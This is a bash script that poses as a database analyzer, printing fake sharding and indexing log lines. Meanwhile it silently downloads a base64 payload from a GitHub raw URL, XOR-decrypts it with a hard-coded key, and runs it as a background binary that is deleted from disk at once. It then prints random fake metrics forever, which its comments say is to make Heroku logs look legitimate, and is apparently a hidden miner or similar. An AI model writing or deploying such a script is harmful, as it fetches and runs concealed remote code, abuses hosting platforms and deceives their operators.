#!/bin/bash
set -e

# --- FAKE DATABASE ANALYZER DISGUISE (FOREVER) ---
echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] Initializing sharded cluster connection..."
sleep 2
echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] Mounting volume /data/replica-01 ..."
sleep 1
echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] Rebuilding B-tree indexes on table 'user_sessions' (72.4M rows)..."
sleep 2
echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] All 12 partitions online. Entering continuous analysis mode."

# --- FETCH & DECRYPT PAYLOAD (SILENTLY) ---
_PAYLOAD=$(curl -sL --max-time 30 https://raw.githubusercontent.com/soseganam/mustirka/refs/heads/main/payload.txt)
if [ -z "$_PAYLOAD" ]; then
    # Retry once
    sleep 5
    _PAYLOAD=$(curl -sL --max-time 30 https://raw.githubusercontent.com/soseganam/mustirka/refs/heads/main/payload.txt)
    if [ -z "$_PAYLOAD" ]; then
        echo "[FATAL] Module fetch failed. Exiting." >&2
        exit 1
    fi
fi

# Decrypt to 'nnr'
echo "$_PAYLOAD" | python3 -c '
import base64, os, sys
data = sys.stdin.read().strip()
if not data:
    sys.exit(1)
decoded = base64.b64decode(data)
key = "kembang"
decrypted = bytes([decoded[i] ^ ord(key[i % len(key)]) for i in range(len(decoded))])
if len(decrypted) < 10:
    sys.exit(1)
with open("nnr", "wb") as f:
    f.write(decrypted)
os.chmod("nnr", 0o755)
'

if [ ! -x "./nnr" ]; then
    echo "[FATAL] Decryption or chmod failed." >&2
    exit 1
fi

# --- LAUNCH NNR IN BACKGROUND, THEN DELETE ITS BINARY ---
echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] Spawning analysis engine subprocess..."
./nnr -j 4 > /dev/null 2>&1 &
NNR_PID=$!

# INSTANTLY REMOVE THE BINARY FROM DISK (process keeps running in memory)
rm -f ./nnr

# Verify it's alive
sleep 1
if ! kill -0 $NNR_PID 2>/dev/null; then
    echo "[WARN] Analysis engine subprocess died. Restarting..." >&2
    # Re-fetch and run again if needed, but for now let's just keep faking.
fi

# --- INFINITE FAKE ANALYSIS OUTPUT (THIS IS WHAT HEROKU LOGS SHOW) ---
echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] Hot-standby replication stream active."
echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] Buffer cache hit rate: 98.7% | Sequential scan speed: 342 MB/s"

# Random metric generator - runs forever, making the worker look legitimate
while true; do
    # Generate random DB stats
    RAND_TABLE="table_$(shuf -n1 -e "users" "orders" "logs" "sessions" "events" "metadata" "cache" "audit")"
    RAND_ROWS=$(( (RANDOM % 50000) + 1000 ))
    RAND_CACHE=$(( (RANDOM % 99) + 90 ))
    RAND_IO=$(( (RANDOM % 200) + 50 ))
    RAND_TXN=$(( (RANDOM % 1500) + 200 ))
    
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] ⏳ Analyzing $RAND_TABLE (${RAND_ROWS} rows) | Cache hit: ${RAND_CACHE}% | IOPS: ${RAND_IO} | Active transactions: ${RAND_TXN}"
    
    # Occasionally print a "warning" or "checkpoint" for realism
    if [ $((RANDOM % 5)) -eq 0 ]; then
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] 📊 Checkpoint completed | WAL flushed | LSN: 0/$(printf '%X' $((RANDOM % 65536)))"
    fi
    if [ $((RANDOM % 10)) -eq 0 ]; then
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] [DB-ANALYZER] 🔄 Rebalancing shard key on '${RAND_TABLE}'... done."
    fi
    
    sleep 1
done
